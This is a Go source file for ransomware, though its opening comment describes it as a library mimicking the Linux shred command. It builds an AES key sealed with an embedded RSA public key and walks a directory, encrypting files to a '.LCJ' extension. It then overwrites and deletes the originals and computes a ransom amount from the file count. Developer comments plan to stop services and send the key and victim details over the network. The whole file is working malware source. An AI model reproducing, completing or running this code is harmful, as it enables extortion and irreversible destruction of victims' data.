// Package shred is a golang library to mimic the functionality of the linux shred command
package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// lisandro : change the encryption swipe time from 3 to 2 ? (1?)

// change the key var by another random string at the end of the program

// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and a e-mail
// and send with the message the encryption key



import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var key []byte
var file_count int
var saved_ext = [...]string{"LCJ", "dll", "exe", "iso", "img", "msi", "deb", "ini",}

func init() {
	 //rand.Seed not working
	 //rand.Seed(time.Now().UnixNano())
}

// ========= GENERAL =========
func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}
// ========= END GENERAL =========
// ========= SHRED =========

// Conf is a object containing all choices of the user
type Conf struct {
	Times  int
	Zeros  bool
	Remove bool
}

// Path shreds all files in the location of path
// recursively. If remove is set to true files will be deleted
// after shredding. When a file is shredded its content
// is NOT recoverable so USE WITH CAUTION!!!

func (conf Conf) Path(path string) error {
	stats, err := os.Stat(path)
	Error(err)

	if stats.IsDir() {
		return conf.Dir(path)
	}

	return conf.File(path)
}

// Dir overwrites every File in the location of path and everything in its subdirectories
func (conf Conf) Dir(path string) error {
	var chErrors []chan error

	walkFn := func(path string, info os.FileInfo, err error) error {
		Error(err)

		if info.IsDir() {
			return nil
		}

		chErr := make(chan error)
		chErrors = append(chErrors, chErr)
		go func() {
			err := conf.File(path)
			chErr <- err
		}()

		return nil
	}

	if err := filepath.Walk(path, walkFn); err != nil {
		return err
	}

	for _, chErr := range chErrors {
		if err := <-chErr; err != nil {
			return err
		}
	}

	return nil
}

// File overwrites a given File in the location of path
func (conf Conf) File(path string) error {
	for i := 0; i < conf.Times; i++ {
		if err := overwriteFile(path, true); err != nil {
			return err
		}
	}

	if conf.Zeros {
		if err := overwriteFile(path, false); err != nil {
			return err
		}
	}

	if conf.Remove {
		var err = os.Remove(path)
		if err!=nil { return err }
	}

	return nil
}

func overwriteFile(path string, random bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	defer f.Close()

	info, err := f.Stat()
	Error(err)

	buff := make([]byte, info.Size())
	if random {
		if _, err := rand.Read(buff); err != nil {
			return err
		}
	}

	_, err = f.WriteAt(buff, 0)
	return err
}

// ========= END SHRED =========

// ========= ENCRYPT =========

func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
	var public_key string =
		`-----BEGIN RSA PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzDWv5CHdcXXm0/zidDK3
OskEhr+uulnIjkgyAxHWypif8zb4GQg0UVdfvoADMBPTlrtlLofb7dfex4uoFu+C
QUKG0MK5upKNH9cqkBwpZ/Mc3iEy5fbCmXYq034eKfBtXIn0ZqKpI88wMCfwzYhg
oDdrifgnxhQlLq2O+5knVEbspomTrIuk3Wa4c0ISpEG0FTbVAg6d9SZEmQQEJRte
H6sI6cUVqz/WCpTR2Y+YgOepFR4KrVdIp6P3hUxR0h1T9ta+xZx7IE9i7s/PR7nF
H+PSRaZdfMje1zV5eP7q9kyyeRGPiUi63Mc/olsifR+7tJWiJk5FuHJZLO3ED8ay
H8adslQQvZwMI64G2DOK/8bMaxbNYuIaxDiKyHI/yvvjK+PeHijomaX0eed+TaeI
nd20YLG/UGwntqwOdHCuBllpEHqtiaAW+rkBYt3Mw7DI22/8dFKb63+eC/kUlVQZ
bMwdwh1itYO3s9zqlsA1mw6q6es6CWKyftN+3ZjRbTZ5zP2fzt4oN2DreqPvQ3N5
mQol6woaxEqtFvOPhOUgvdZHwcIU8l5KZSThodvkveWfUt4QTCPOhpJhPmvMK2zA
Yf5Oh4DzwxhQBx1Xm6bWFoZblaYV6UwWRuj6EN9Tztmk7NwQWztXjfbU1QQAaB4c
Zc6Wn4O42nkRXdypLvTdUasCAwEAAQ==
-----END RSA PUBLIC KEY-----
`
	block, _ := pem.Decode([]byte(public_key))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		return pub, nil
	default:
		break // fall through
	}
	return nil, errors.New("Key type is not RSA")
}

func encrypt_encryption_key(k []byte) []byte {
	public_key, _  := ParseRsaPublicKeyFromPemStr()
	encryptedBytes, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		public_key,
		[]byte(k),
		nil)
	if err != nil {
		panic(err)
	}
	return encryptedBytes
}

func rand_str(str_size int) string {
	var alphanum string =
		"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&'()[]{}*+-_!?.,;:"
	var bytes = make([]byte, str_size)
	rand.Read(bytes)
	for i, b := range bytes {
		bytes[i] = alphanum[b%byte(len(alphanum))]
	}
	return string(bytes)
}

func create_encryption_key() []byte {
	new_key := []byte(rand_str(32))
	encrypted_new_key :=  encrypt_encryption_key(new_key)
	err := ioutil.WriteFile("key", encrypted_new_key, 0644)
	if err != nil {
		fmt.Printf("Error creating Key file!")
		os.Exit(0)
	}
	return new_key
}

func check_key() {
	the_key, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		key = create_encryption_key() //If not, create one
	} else {
		key = the_key //If so, set key as the key found in the file
	}
}

func encryptFile(inputfile string, outputfile string) {
	b, err := ioutil.ReadFile(inputfile) //Read the target file
	Error(err)
	ciphertext := encrypt(key, b)
	//fmt.Printf("%x\n", ciphertext)
	err = ioutil.WriteFile(outputfile, ciphertext, 0644)
	if err != nil {
		fmt.Printf("Unable to create encrypted file!\n")
		os.Exit(0)
	}
}

func encodeBase64(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func encrypt(key, text []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	b := encodeBase64(text)
	ciphertext := make([]byte, aes.BlockSize+len(b))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(ciphertext[aes.BlockSize:], b)
	return ciphertext
}

// ========= END ENCRYPT =========

func list_dir(path string)([]string){
	searchDir := path
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return err
	})

	if e != nil {
		panic(e)
	}
	return fileList
}

func remove_to_index(s []string, index int) ([]string) {
	sub := make([]string, len(s))
	copy(sub, s)
	sub = append(sub[index:len(s)], s[len(s):]...)
	return sub
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		fmt.Println(err)
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

func file_to_byte(file string)(int64){
	fi, err := os.Stat(file)
	Error(err)
	return fi.Size()
}

func byte_to_mega(file int64)(float64){
	var file_size float64 = float64((file / 1024) / 1024)
	return file_size
}

func is_windows(file string)(){
	s := strings.Split(file, "/")
	if (s[len(s)-1] == "Windows"){
		fileList := list_dir(file)
		for _, f := range fileList {
			s1 := strings.Split(f, "/")
			if (s1[len(s)-1] == "System32"){ // 19111999 :

			}
		}
	} else{
		return;
	}
	//fmt.Println(s[len(s)-1])
}

func check_ext(file string) bool{
	ext_split := strings.Split(file, ".")
	file_ext  := ext_split[len(ext_split)-1:][0]
	for _, ext := range saved_ext{
		if file_ext == ext{
			fmt.Println(file)
			return true
		}
	}
	return false
}

func ransom_amount(files_encrypted int) int{
	return int(float32(files_encrypted) * 1.25)
}

func pass()(){
	_ = ""
}

func file_list(path string)(){
	file_tree := list_dir(path)

	shredconf := Conf{Times: 2, Zeros: true, Remove: true}
	start := time.Now()
	for i := 1; i <= 3; i++ { // edode : 50 150 and the left ones
		var max_size float64
		for _, file := range file_tree {

			var pa *[]string
			pa = &file_tree
			fmt.Println("In for : ", &pa)

			if is_dir(file){
				file_tree = remove_to_index(file_tree, 1)
				continue
			}
			if check_ext(file){ // lisandro : exe ?
				file_tree = remove_to_index(file_tree, 1)
				continue
			}

			if i == 1 {
				max_size = 50
			} else if i == 2 {
				max_size = 150
			} else if i == 3  {
				max_size = 9999999999
			}

			file_byte := file_to_byte(file)
			size := byte_to_mega(file_byte)
			if size <= max_size {
				encryptFile(file, file+".LCJ")
				shredconf.Path(file)
				file_tree = remove_to_index(file_tree, 1)
				file_count++
			} else {
				fmt.Println(file)
				file_tree = remove_to_index(file_tree, 1)
				file_tree = append(file_tree, file)
				continue
			}
		}
	}
	elapsed := time.Since(start)
	log.Printf("SECOND ELAPSED : %s", elapsed)
}

func main() {
	check_key()
	path := "/root/y"
	file_list(path)
	fmt.Println(file_count, ransom_amount(file_count))
	//file_list(path, false)
}























